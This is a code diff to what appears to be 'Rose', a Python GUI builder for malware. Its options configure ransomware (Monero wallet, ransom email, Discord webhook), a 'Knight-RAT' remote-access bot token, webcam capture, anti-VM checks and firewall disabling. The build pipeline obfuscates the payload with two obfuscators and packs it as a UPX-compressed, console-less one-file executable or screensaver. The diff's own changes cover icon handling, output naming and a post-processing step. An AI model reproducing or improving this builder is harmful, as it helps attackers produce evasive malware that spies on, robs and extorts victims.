@@ -73,10 +73,8 @@ data_builder = {
     "disable_firewalls": False,
     "antivm": False,
     "webcam": False,
-    "icon_file": "",
     "obfuscation": False,
     "type_file": "",
-    "icon_path": "",
     "ransomware_monero_wallet_adress": "",
     "ransomware_email_adress": "",
     "ransomware_discord_webhook_url": "",
@@ -182,9 +180,6 @@ def _makebuild(q: Queue, data_builder) -> str:
     if data_builder["webhook_url"] == "":
         ui.notify("Webhook URL is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
         return
-    if data_builder["antivm"] == "":
-            ui.notify("Anti-VM Webhook URL is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
-            return
     if data_builder["build_name"] == "":
         ui.notify("Build Name is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
         return
@@ -193,10 +188,6 @@ def _makebuild(q: Queue, data_builder) -> str:
         return
     if data_builder["knight_rat"] and data_builder["knight_bot_token"] == "":
         ui.notify("Knight-RAT Bot Token is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
-        return
-    
-    if data_builder["icon_file"] == "":
-        ui.notify("No build icon selected!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
         return
     
     if data_builder["type_file"] == "":
@@ -218,7 +209,8 @@ def _makebuild(q: Queue, data_builder) -> str:
     blankobf = os.path.join(Path(__file__).resolve().parent.parent, 'utils', 'obfuscation', 'blankobf.py')
     pycloak = os.path.join(Path(__file__).resolve().parent.parent, 'utils', 'obfuscation', 'pycloak-main')
     rvenv = os.path.join(Path(__file__).resolve().parent.parent.parent, 'rosevenv', 'Scripts', 'activate')
-    final = 'dist\\obf2-rose.exe' if data_builder["obfuscation"] else 'dist\\rose.exe'
+    final = 'dist\\Built.exe'
+    post = os.path.join(Path(__file__).resolve().parent.parent, 'utils', 'comp', 'post.py')
         
     logger.info(path+rosef+rosefu+blankobf)
     def create_dir():
@@ -294,13 +286,13 @@ def _makebuild(q: Queue, data_builder) -> str:
                 logger.info("Entering obfuscate process")
                 obf1 = f'call {rvenv} && python {blankobf} -o {rosefu} {rosef}'
                 logger.info(obf1)
-                subprocess.call(obf1, shell=True, stdout=open('obf-blank.txt', 'w'), stderr=subprocess.STDOUT)
+                subprocess.call(obf1, shell=True, stderr=subprocess.STDOUT)
                 install = f'call {rvenv} && cd "{pycloak}" && pip install .'
                 logger.info(install)
-                subprocess.call(install, shell=True, stdout=open('obf-install.txt', 'w'), stderr=subprocess.STDOUT)
+                subprocess.call(install, shell=True, stderr=subprocess.STDOUT)
                 obf2 = f'call {rvenv} && pycloak -o {rosefub} -d {rosefu}'
                 logger.info(obf2)
-                subprocess.call(obf2, shell=True, stdout=open('obf-pycloak.txt', 'w', encoding='utf-8', errors='ignore'), stderr=subprocess.STDOUT)
+                subprocess.call(obf2, shell=True, stderr=subprocess.STDOUT)
                 os.remove(rosefu)
                 logger.info("Finished obfuscate process")
             except Exception as e:
@@ -407,11 +399,11 @@ def _makebuild(q: Queue, data_builder) -> str:
         himports = [item for item in himports if item]
         
         imports = " ".join(["--hidden-import=" + module for module in himports])
-        compile_line = f'call {rvenv} && pyinstaller "{rosefub if data_builder["obfuscation"] else rosef}" --clean --icon="{data_builder["icon_path"]}" --upx-dir="{upx_dir}" --noconsole --onefile {imports}'
+        compile_line = f'call {rvenv} && pyinstaller "{rosefub if data_builder["obfuscation"] else rosef}" --clean --name="Built" --upx-dir="{upx_dir}" --noconsole --onefile {imports}'
         try:
             logger.info("Entering python compile process")
             logger.info(f'Python Compile CMD Line: {compile_line}')
-            output_file = "rosecompile-py.log"
+            output_file = "rosecompile.log"
             subprocess.call(
                 compile_line,
                 shell=True,
@@ -419,22 +411,19 @@ def _makebuild(q: Queue, data_builder) -> str:
                 stderr=subprocess.STDOUT
             )
             logger.info(f"Output of Python compile process saved in rosecompile.log")
+            subprocess.call(f'call {rvenv} && python {post} dist/Built.exe', shell=True, stderr=subprocess.STDOUT)
         except Exception as e:
             logger.error(f"Error in py compile: {e}")
 
     def cleanup():
         logger.info("Entered cleanup")
 
-        backup_dir = data_builder['build_name'] + '_backup'
-
         try:
-            shutil.move(os.path.join(os.getcwd(), 'dist', "obf2-rose.exe" if data_builder['obfuscation'] else "rose.exe"), os.path.join(os.getcwd(), f"{data_builder['build_name']}.exe"))
+            shutil.move(final, os.path.join(os.getcwd(), f"{data_builder['build_name']}.exe"))
             shutil.rmtree(os.path.join(os.getcwd(), 'build'))
             shutil.rmtree(os.path.join(os.getcwd(), 'dist'))
             shutil.rmtree(os.path.join(os.getcwd(), "resources", "ui", data_builder['build_name']))
-            os.remove(os.path.join(os.getcwd(), "obf2-rose.spec" if data_builder['obfuscation'] else "rose.spec"))
-            if os.path.exists(backup_dir) and os.path.isdir(backup_dir):
-                shutil.rmtree(backup_dir)
+            os.remove(os.path.join(os.getcwd(), "Built.spec"))
         except Exception as e:
             logger.error(f"Error in cleanup: {e}")
 
@@ -500,17 +489,6 @@ def _makebuild(q: Queue, data_builder) -> str:
     q.put_nowait(1)
     return 'Done!'
 
-def select_icon():
-    root = tk.Tk()
-    root.withdraw()
-
-    file_path = filedialog.askopenfilename(filetypes=[("ICO Files", "*.ico")])
-    
-    if file_path:
-        change_data("icon_path", file_path)
-    
-    root.destroy()
-
 def _home():
     with ui.dialog() as dialog, ui.card():
         ui.label(f'If the compilation process completed successfully, you should find the executable file within the designated folder. In case you encounter any issues, we kindly invite you to join our Discord community for further assistance.')
@@ -541,12 +519,6 @@ def _home():
                 placeholder='Rose on top baby',
                 on_change=lambda e: change_data("build_name", e.value)
             ).props('inline color=pink-3').classes('w-full')
-            choose_file_icon = ui.select(
-                label='File icon',
-                options=['Windows Exe', 'Use Custom'],
-                on_change=lambda e: change_data("icon_file", e.value)
-            ).props('inline color=pink-3').classes('w-full')
-            ui.button('Set custom file icon', on_click=select_icon).props("icon=code color=purple-11").bind_visibility_from(choose_file_icon, 'value')
             ui.select(
                 label='File type',
                 options=["Executable (.exe)", "Screensaver (.scr)"],
@@ -670,7 +642,7 @@ def _github():
     with ui.card():
         with ui.row():
             ui.button("Open Rose Log", on_click=lambda: os.startfile(os.path.join(os.getcwd(), 'roselog.log')))
-            ui.button("Open Rose Compile Log (.py)", on_click=lambda: os.startfile(os.path.join(os.getcwd(), 'rosecompile-py.log')))
+            ui.button("Open Rose Compile Log (.py)", on_click=lambda: os.startfile(os.path.join(os.getcwd(), 'rosecompile.log')))
 
         with ui.column():
             ui.markdown(f"<code>Message from {__devmsg__[0]}: {__devmsg__[1]}</code>")
